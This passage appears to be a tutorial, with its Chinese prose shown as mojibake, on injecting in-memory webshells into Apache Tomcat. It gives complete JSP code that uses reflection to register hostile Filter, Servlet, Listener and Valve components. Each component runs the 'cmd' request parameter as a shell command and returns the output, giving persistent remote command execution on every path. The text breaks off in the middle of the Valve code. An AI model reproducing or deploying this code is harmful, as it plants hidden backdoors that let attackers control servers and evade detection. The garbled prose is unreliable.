FilterConfig StandardContextæä¾›äº†addFilterDefæ–¹æ³•æ¥æ·»åŠ FilterDefs\nStandardContextä¸­filterConfigså‚æ•°å®é™…ä¸Šæ˜¯ä¸ªhashmapï¼Œé€šè¿‡åå°„è·å–filterConfigsï¼Œç„¶åputå³å¯ã€‚\næ¥ä¸‹æ¥æ˜¯éœ€è¦æ„é€ ApplicationFilterConfigç±»çš„å¯¹è±¡å³å¯ï¼ŒApplicationFilterConfigå®é™…ä¸Šå°±æ˜¯FilterConfigçš„å®ç°ç±»ï¼ŒæŸ¥çœ‹ApplicationFilterConfigçš„æ„é€ ç±»ï¼Œéœ€è¦ä¼ å…¥Contextå’ŒFilterDefã€‚é€šè¿‡åå°„å®ç°æ„é€ å‡½æ•°å®ä¾‹åŒ–å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­ */ standardContext.addFilterDef(filterDef); // åå°„è·å¾—ApplicationFilterConfigçš„æ„é€ æ–¹æ³• Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); // å®ä¾‹åŒ– ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); // å‹å…¥filterConfigs filterConfigs.put(filtername,filterConfig); FilterMaps filterMapséœ€è¦è®¾ç½®åç§°ï¼Œpatternï¼Œdispatcher\nè¿™é‡Œçš„dispatcheréœ€è¦è®¾ç½®ä¸ºDispatcherType.REQUESTï¼Œè¯¥é€‰é¡¹æŒ‡å®šäº†filterè¿‡æ»¤å™¨æ ¹æ®DispatcherTypeçš„ç±»å‹æ˜¯å¦æ‰§è¡Œã€‚è¿™\nFilterMapså¯ä»¥ç”¨ä¸¤ç§æ–¹å¼æ·»åŠ mapï¼šaddFilterMap æˆ–è€…addFilterMapBefore()ï¼Œåè€…å¯ä»¥å°†filteræ·»åŠ è‡³æœ€å‰é¢,è¿™å°±è§£å†³äº†Filteræ‰§è¡Œé¡ºåºçš„é—®é¢˜ã€‚\n1 2 3 4 5 6 FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(filtername); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); æ•ˆæœ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.util.Map\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %\u003e \u003c%@ page import=\"java.lang.reflect.Constructor\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %\u003e \u003c%@ page import=\"org.apache.catalina.Context\" %\u003e \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c% final String name = \"reus09\"; ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); if (filterConfigs.get(name) == null){ Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(\"cmd\") != null){ byte[] bytes = new byte[1024]; Process process = new ProcessBuilder(\"bash\",\"-c\",req.getParameter(\"cmd\")).start(); int len = process.getInputStream().read(bytes); servletResponse.getWriter().write(new String(bytes,0,len)); process.destroy(); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); /** * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­ */ standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); filterConfigs.put(name,filterConfig); out.print(\"Filter Inject Success !\"); } %\u003e å¯ä»¥çœ‹åˆ°æ¶æ„çš„Filterå·²ç»æ·»åŠ åˆ°å†…å­˜ä¸­ï¼Œæ¯ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šå…ˆè¢«æ¶æ„Filterçš„doFilterè¿›è¡Œå¤„ç†ã€‚\nå› ä¸ºæ³¨å†Œçš„url-patternä¸º/*ï¼Œæ‰€ä»¥ä»»æ„è·¯å¾„åé¢åŠ ?cmd=commandå³å¯æ‰§è¡Œå‘½ä»¤ã€‚\nServletå†…å­˜é©¬ å…ˆæ¥çœ‹ä¸€ä¸‹å®ç°ç±» ApplicationContext çš„ addServlet æ–¹æ³•ã€‚\nServletè°ƒç”¨é“¾ æˆ‘ä»¬çŸ¥é“ï¼šContext è´Ÿè´£ç®¡ç† Wapper ï¼Œè€Œ Wapper åˆè´Ÿè´£ç®¡ç† Servlet å®ä¾‹ã€‚\né€šè¿‡StandardContext.createWapper()åˆ›å»ºWapperå¯¹è±¡ã€‚\nåœ¨org.apache.catalina.core.StandardWrapper#setServletClassä¸‹æ–­ç‚¹,ç„¶ådebug\nåœ¨ContextConfig#webconfig()å¤„é…ç½®webconfigï¼Œæ ¹æ®web.xmlé…ç½®context\nç„¶åè°ƒç”¨äº†configureContext(),configureContext()ä¾æ¬¡è¯»å–äº† Filterã€Listenerã€Servletçš„é…ç½®åŠå…¶æ˜ å°„ã€‚\nåœ¨Servletéƒ¨åˆ†createWrapper()ã€è®¾ç½®äº†å¯åŠ¨ä¼˜å…ˆçº§LoadOnStartUpä»¥åŠservletNameã€‚è¿™é‡ŒloadOnStartupå°±æ˜¯è´Ÿè´£åŠ¨æ€æ·»åŠ Servletçš„å‡½æ•°\nç„¶åè®¾ç½®ServletClass,æœ€åå°†wrapperæ·»åŠ åˆ°StandardContextçš„childé‡Œé¢\nå¾ªç¯éå†å®Œäº†æ‰€æœ‰servletsï¼Œæ¥ä¸‹æ¥æ·»åŠ Servlet-Mapperï¼Œä¹Ÿå°±æ˜¯web.xmlä¸­çš„ã€‚å¾ªç¯addServletMappingDecodedå°†urlå’Œservletç±»åšæ˜ å°„\næœ€åé¢å¤–è®²ä¸€ä¸‹loadOnStartupçš„ä½œç”¨ï¼Œéå†æ‰€æœ‰çš„ä¸ªWrapperï¼Œæ¯ä¸ªwrapperè·å–å…¶å¯¹åº”çš„loadOnStartUpå€¼ï¼Œå¦‚æœæ˜¯\u003e=0ï¼Œé‚£ä¹ˆå°±åŠ å…¥åˆ°listä¸­ï¼Œå¦åˆ™loadOnstartup\u003c0ï¼Œåˆ™ä¸ä¼šè¢«åŠ¨æ€æ·»åŠ åˆ°å®¹å™¨ã€‚è¯¥å±æ€§å¯¹åº”äº†web.xmlä¸­çš„ï¼Œè¯¥å±æ€§é»˜è®¤-1ã€‚\næ¥ä¸‹æ¥æ˜¯æ˜¯å¯¹æ»¡è¶³æ¡ä»¶\u003e=0çš„listé‡Œé¢çš„wrapperè¿›è¡Œè£…é…ï¼Œå› æ­¤è¦æƒ³å†…å­˜é©¬æ³¨å†Œçš„Servletæœ‰æ•ˆï¼ŒloadOnStartUpçš„å€¼éœ€è¦\u003e=0ã€‚\næ€»ç»“ä¸€ä¸‹servletæ³¨å†Œè¿‡ç¨‹ï¼š\nè°ƒç”¨StandardContext.createWrapperä¸ºservletåˆ›å»ºwrapper é…ç½®LoadOnStartupå¯åŠ¨ä¼˜å…ˆçº§ é…ç½®ServletName é…ç½®ServletClass addChildæ·»åŠ wrapperåˆ°Context addServletMappingDecodeæ·»åŠ æ˜ å°„ åˆ©ç”¨è¿‡ç¨‹ è·å–Context 1 2 3 4 Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); final Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); ç”Ÿæˆæ¶æ„Servlet åœ¨ä¹‹å‰åˆ†æçš„ApplicationFilterChain#doFilter()æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œå®Œfilter.doFilter()åï¼Œä¼šè°ƒç”¨servlet.service()\nservice()æ–¹æ³•å®é™…ä¸Šåœ¨HttpServlet.classä¸­ï¼Œæä¾›äº†å¤šç§httpæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”Ÿæˆæ¶æ„Servletæ—¶å€™ï¼Œä¸ä»…å¯ä»¥åœ¨servletä¸­é‡å†™doGetã€doPostç­‰è§¦å‘RCEï¼Œä¹Ÿå¯ä»¥ç›´æ¥é‡å†™serviceæ–¹æ³•ä»è€Œè§¦å‘RCE\næ¶æ„HttpServletä»£ç å¦‚ä¸‹ï¼š\næ ¹æ®æœåŠ¡å™¨çš„ç³»ç»Ÿæ‰§è¡Œä¸åŒçš„shell,æœ€åè°ƒç”¨Runtime.getRuntime().exec(cmd)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 HttpServlet servlet = new HttpServlet() { @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { if (request.getParameter(\"cmd\") != null) { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", request.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", request.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; response.getWriter().write(output); response.getWriter().flush(); } } }; ç”Ÿæˆwrapper æ ¹æ®è°ƒç”¨é“¾ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨StandardContextçš„createWrapperæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªWrapperå¯¹è±¡\n1 2 3 4 5 6 7 Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"reus09\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(servlet); wrapper.setServletClass(servlet.getClass().getName()); standardContext.addChild(wrapper); æ·»åŠ æ˜ å°„ StandardContextæä¾›äº†addServletMappingDecodedæ–¹æ³•æ¥å®ç°ä¸ºServletæ·»åŠ url-pattern\n1 standardContext.addServletMappingDecoded(\"/*\", \"reus09\"); æ•ˆæœ å®Œæ•´ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Request\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"org.apache.catalina.Wrapper\" %\u003e\u003c%-- Created by IntelliJ IDEA. User: reus09 Date: 2023/4/15 Time: 20:27 To change this template use File | Settings | File Templates. --%\u003e \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c% Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); final Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); HttpServlet servlet = new HttpServlet() { @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { if (request.getParameter(\"cmd\") != null) { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", request.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", request.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; response.getWriter().write(\"Servlet Injection Success!\\n\"+output); response.getWriter().flush(); } } }; Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"reus09\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(servlet); wrapper.setServletClass(servlet.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\"/*\",\"reus09\"); out.print(\"Inject Success !\"); %\u003e æ¶æ„çš„Servletå·²ç»æ³¨å†Œåˆ°StandardContextçš„Childé‡Œ\nå› ä¸ºæ³¨å†Œçš„url-patternä¸º/*ï¼Œæ‰€ä»¥ä»»æ„è·¯å¾„åé¢åŠ ?cmd=commandå³å¯æ‰§è¡Œå‘½ä»¤ã€‚\nListenerå†…å­˜é©¬ å®ç°äº†EvenListenerçš„ServletRequestListener æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³•åœ¨ request è¯·æ±‚åˆ›å»ºå’Œé”€æ¯æ—¶è¿›è¡Œå¤„ç†ï¼Œæ¯”è¾ƒé€‚åˆæˆ‘ä»¬ç”¨æ¥åšå†…å­˜é©¬ã€‚\nListenerè°ƒç”¨è¿‡ç¨‹ servletå¯åŠ¨æ—¶ï¼Œåœ¨StandardHostvalve#invoke()ä¸­å¯¹ç›‘å¬å™¨è¿›è¡Œæ£€æŸ¥\næ¯”è¾ƒå…³é”®çš„æ˜¯ï¼Œä¼šè°ƒç”¨context.fireRequestInitEvent()é‡Œé¢çš„getApplicationEventListenersæ–¹æ³•è·å–å…¨éƒ¨Listener\nç„¶ååˆ¤æ–­æœ‰Listenerå¹¶ä¸”ä¸ºServletRequestListenerå­ç±»ï¼Œå°±è°ƒç”¨ServletRequestListener#requestInitialized()æ–¹æ³•\nåŒæ ·ï¼Œåœ¨context.fireRequestDistroyEvent()æ–¹æ³•ä¸­ï¼Œå®ç°äº†å¯¹åº”ç›‘å¬å™¨çš„é”€æ¯ï¼Œä¸åˆå§‹åŒ–æµç¨‹ç›¸è¿‘ï¼Œå°±ä¸åœ¨èµ˜è¿°ã€‚\nç”±æ­¤å¯è§ç”ŸæˆListeneråªéœ€è¦ç»è¿‡ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯requestInitialized()ï¼Œä¸€ä¸ªæ˜¯requestDestroyed()ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•é‡å†™åæ•ˆæœæ˜¯ä¸€æ ·çš„\næ„å»ºListenerå†…å­˜é©¬æµç¨‹ï¼šç”Ÿæˆæ¶æ„Listenerï¼Œç„¶åæ”¾å…¥Context åˆ©ç”¨è¿‡ç¨‹ è·å–Context 1 2 3 4 Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); ç”Ÿæˆæ¶æ„listener åˆ›å»ºListeneréœ€è¦æ‰§è¡ŒServletRequestListener#requestInitialized()\né‚£å°±newä¸€ä¸ªServletRequestListenerç±»ç„¶åé‡å†™requestInitializedæ–¹æ³•å³å¯ã€‚\nrequestInitialized()æ–¹æ³•çš„å‚æ•°ä¸ºServletRequestEventç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getServletRequestæ–¹æ³•è·å¾—HttpServletRequestå¯¹è±¡ã€‚\nå‘ç°å¹¶æ²¡æœ‰responseå¯¹è±¡å®ç°é¡µé¢å›æ˜¾ï¼Œå› ä¸ºæˆ‘ä»¬è·å–StandardContextçš„æ—¶å€™ï¼Œè·å–åˆ°Requestç±»å‹çš„request1,æˆ‘ä»¬å¯ä»¥è°ƒç”¨request1.getResponse()æ¥è·å–ä¸€ä¸ªHttpServletResponseå¯¹è±¡ä»è€Œå®ç°é¡µé¢å›æ˜¾ã€‚\næ³¨æ„è¿™é‡Œrequest1éœ€è¦ç”¨finalä¿®é¥°ï¼Œä¸ç„¶åœ¨newServletRequestListeneråŒ¿åå†…éƒ¨ç±»é‡Œæ— æ³•ä½¿ç”¨ï¼Œä¼šæŠ¥Cannot refer to the non-final local variable request1 defined in an enclosing scopeé”™è¯¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ServletRequestListener listener = new ServletRequestListener() { @Override public void requestInitialized(ServletRequestEvent sre) { HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); HttpServletResponse resp = request1.getResponse(); if (req.getParameter(\"cmd\") != null) { try { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", req.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", req.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\A\"); String out = s.hasNext() ? s.next() : \"\"; resp.getWriter().write(\"Listener Injection Success\" + out); resp.getWriter().flush(); } catch (IOException ioe) { ioe.printStackTrace(); } } } @Override public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\"1\"); } }; æ·»åŠ listener StandardContextå®ç°äº†addApplicationEventListener()å‘applicationEventListenersListä¸­æ·»åŠ listererã€‚\n1 standardContext.addApplicationEventListener(listener); æ•ˆæœ å®Œæ•´ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Request\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@page import=\"javax.servlet.ServletRequestListener\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e\u003c%-- Created by IntelliJ IDEA. User: reus09 Date: 2023/4/15 Time: 21:12 To change this template use File | Settings | File Templates. --%\u003e \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c% Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); final Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); ServletRequestListener listener = new ServletRequestListener() { @Override public void requestInitialized(ServletRequestEvent sre) { HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); HttpServletResponse resp = request1.getResponse(); if (req.getParameter(\"cmd\") != null) { try { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", req.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", req.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\A\"); String out = s.hasNext() ? s.next() : \"\"; resp.getWriter().write(\"Listener Injection Success\" + out); resp.getWriter().flush(); } catch (IOException ioe) { ioe.printStackTrace(); } } } @Override public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\"1\"); } }; standardContext.addApplicationEventListener(listener); %\u003e å¯ä»¥çœ‹åˆ°StandardContextä¸­å·²ç»æ·»åŠ äº†æˆ‘ä»¬çš„æ¶æ„Listenerã€‚\nå½“æˆ‘ä»¬è®¿é—®å·²çŸ¥è·¯å¾„çš„èµ„æº + ?cmd=commandå³å¯å®ç°å‘½ä»¤æ‰§è¡Œ\nTomcat valveå†…å­˜é©¬ åŸºç¡€çŸ¥è¯† Tomcat åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚è°ƒç”¨é€»è¾‘æ—¶ï¼Œæ˜¯å¦‚ä½•å¤„ç†å’Œä¼ é€’ Request å’Œ Respone å¯¹è±¡çš„å‘¢ï¼Ÿ\nä¸ºäº†æ•´ä½“æ¶æ„çš„æ¯ä¸ªç»„ä»¶çš„å¯ä¼¸ç¼©æ€§å’Œå¯æ‰©å±•æ€§ï¼ŒTomcat ä½¿ç”¨äº†èŒè´£é“¾æ¨¡å¼æ¥å®ç°å®¢æˆ·ç«¯è¯·æ±‚çš„å¤„ç†ã€‚åœ¨ Tomcat ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼šPipelineï¼ˆç®¡é“ï¼‰å’Œ Valveï¼ˆé˜€ï¼‰ã€‚è¿™ä¸¤ä¸ªæ¥å£åå­—å¾ˆå¥½çš„è¯ é‡Šäº†å¤„ç†æ¨¡å¼ï¼šæ•°æ®æµå°±åƒæ˜¯æµç»ç®¡é“çš„æ°´ä¸€æ ·ï¼Œç»è¿‡ç®¡é“ä¸Šä¸ªä¸€ä¸ªä¸ªé˜€é—¨ã€‚\nPipeline ä¸­ä¼šæœ‰ä¸€ä¸ªæœ€åŸºç¡€çš„ Valveï¼ˆbasicï¼‰ï¼Œå®ƒå§‹ç»ˆä½äºæœ«ç«¯ï¼ˆæœ€åæ‰§è¡Œï¼‰ï¼Œå°è£…äº†å…·ä½“çš„è¯·æ±‚å¤„ç†å’Œè¾“å‡ºå“åº”çš„è¿‡ç¨‹ã€‚Pipeline æä¾›äº† addValve æ–¹æ³•ï¼Œå¯ä»¥æ·»åŠ æ–° Valve åœ¨ basic ä¹‹å‰ï¼Œå¹¶æŒ‰ç…§æ·»åŠ é¡ºåºæ‰§è¡Œã€‚\né¦–å…ˆç®€å•çœ‹ä¸€ä¸‹org.apache.catalina.Pipelineæ¥å£çš„å®šä¹‰\norg.apache.catalina.Valve çš„å®šä¹‰å¦‚ä¸‹ï¼š\nvalveçš„invokeæ–¹æ³•å°†è¯·æ±‚ä¼ å…¥ä¸‹ä¸€ä¸ªvalveã€‚å¦‚æœä¸è°ƒç”¨ä¸‹ä¸€ä¸ªvalveçš„invokeï¼Œé‚£è¯·æ±‚åˆ°æ­¤ä¸­æ–­ã€‚\nTomcat æ¯ä¸ªå±‚çº§çš„å®¹å™¨ï¼ˆEngineã€Hostã€Contextã€Wrapperï¼‰ï¼Œéƒ½æœ‰åŸºç¡€çš„ Valve å®ç°ï¼ˆStandardEngineValveã€StandardHostValveã€StandardContextValveã€StandardWrapperValveï¼‰ã€‚\nåœ¨servletè°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¾æ¬¡è°ƒç”¨valveçš„è¿‡ç¨‹ï¼š\nValveå­˜æ”¾çš„æ–¹å¼å¹¶éç»Ÿä¸€å­˜æ”¾åœ¨Pipelineä¸­ï¼Œè€Œæ˜¯åƒä¸€ä¸ªé“¾è¡¨ä¸€ä¸ªæ¥ç€ä¸€ä¸ªã€‚\nè°ƒç”¨getNext()æ–¹æ³•å³å¯è·å–åœ¨è¿™ä¸ªPipelineä¸Šçš„ä¸‹ä¸ªValveå®ä¾‹\nä¸€èˆ¬ä½¿ç”¨å®ç°äº†valveæ¥å£çš„ValveBaseç±»ï¼š\nvalveçš„ç”Ÿæˆå’Œé…ç½® æ–°å»ºvalve æ–°å»ºvalveåªéœ€è¦ç»§æ‰¿ValveBaseç±»å¹¶å®ç°invokeæ–¹æ³•ï¼Œpipelineç®¡é“ä¼šä¾æ¬¡æ‰§è¡Œvalveçš„invoke\n1 2 3 4 5 6 7 8 9 10 11 public class EvilValve extends ValveBase{ @Override public void invoke(Request request, Response response) { try{ Runtime.getRuntime().exec(\"calc\"); this.getNext().invoke(request, response); }catch (Exception e){ e.printStackTrace(); } } } æ³¨å†Œvalve Tomcat ä¸­ Pipeline ä»…æœ‰ä¸€ä¸ªå®ç°ç±» StandardPipeline,å­˜æ”¾åœ¨ ContainerBase çš„ pipeline å±æ€§ä¸­,å¹¶ä¸” ContainerBase æä¾› addValve æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚\nStandardPipeline æ ‡å‡†ç±»ä¸­çš„addvalveæ–¹æ³•\nTomcat ä¸­å››ä¸ªå±‚çº§çš„å®¹å™¨éƒ½ç»§æ‰¿äº† ContainerBase ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¬åŒæ—¶ç»´æŠ¤äº†è¿™ä¸ª Pipeline å®ä¾‹ï¼ˆStandardPipelineï¼‰ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªå±‚çº§çš„å®¹å™¨çš„æ ‡å‡†å®ç°ä¸Šè°ƒç”¨addvalveæ·»åŠ è‡ªå®šä¹‰çš„ Valve éƒ½å¯ä»¥ã€‚\nè°ƒç”¨valve åœ¨CoyoteAdapter.service()è·å–äº†Pipelineçš„ç¬¬ä¸€ä¸ªValveï¼Œå¹¶ä¸”è°ƒç”¨äº†invoke,å¹¶ä¸”ç¬¬ä¸€ä¸ªvalveå°±æ˜¯StandardEnginevalve\nè·Ÿè¿›åˆ°StandardEngineValve#invokeï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸‹ä¸€ä¸ªinvoke\nåˆ©ç”¨è¿‡ç¨‹ æ ¹æ®valveçš„ç”Ÿæˆå’Œé…ç½®ï¼Œæ¨¡æ‹Ÿæ³¨å†Œæ¶æ„valveï¼š\nè·å–context ä»StandardContextåå°„è·å–StandardPipeline è°ƒç”¨addValveæ·»åŠ æ¶æ„Valve è·å–context 1 2 3 4 Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); final Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); åå°„è·å–StandardPipeline 1 2 3 Field pipeline = ContainerBase.class.getDeclaredField(\"pipeline\"); pipeline.setAccessible(true); StandardPipeline standardPipeline = (StandardPipeline) pipeline.get(standardContext); åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline 1 2 3 4 5 6 7 8 9 10 11 12 ValveBase valveBase = new ValveBase() { @Override public void invoke(Request request, Response response){ try { Runtime.getRuntime().exec(\"open -a Calculator.app\"); } catch (Exception e) { e.printStackTrace(); } } }; // è°ƒç”¨addvalve æ–¹æ³•æ·»åŠ åˆ°pipelineä¸­ standardPipeline.addValve(valveBase); ä¸ºäº†ä½¿æ­£å¸¸invokeèƒ½è¿›è¡Œä¸‹å»ï¼Œæ¶æ„valveä¹Ÿåº”è¯¥è°ƒç”¨ä¸‹ä¸€ä¸ªvalve.invoke\n1 this.getNext().invoke(request, response); æ•ˆæœ å®Œæ•´ä»£ç :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Request\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ContainerBase\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardPipeline\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Response\" %\u003e \u003c%@ page import=\"org.apache.catalina.valves.ValveBase\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e\u003c%-- Created by IntelliJ IDEA. User: reus09 Date: 2023/4/16 Time: 11:36 To change this template use File | Settings | File Templates. --%\u003e \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c% Field requestField = request.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); final Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); Field pipeline = ContainerBase.class.getDeclaredField(\"pipeline\"); pipeline.setAccessible(true); StandardPipeline standardPipeline = (StandardPipeline) pipeline.get(standardContext); ValveBase valveBase = new ValveBase() { @Override public void invoke(Request request, Response response){ try { if (request.getParameter(\"cmd\") != null) { boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", request.getParameter(\"cmd\")} : new String[]{\"cmd.exe\", \"/c\", request.getParameter(\"cmd\")}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new 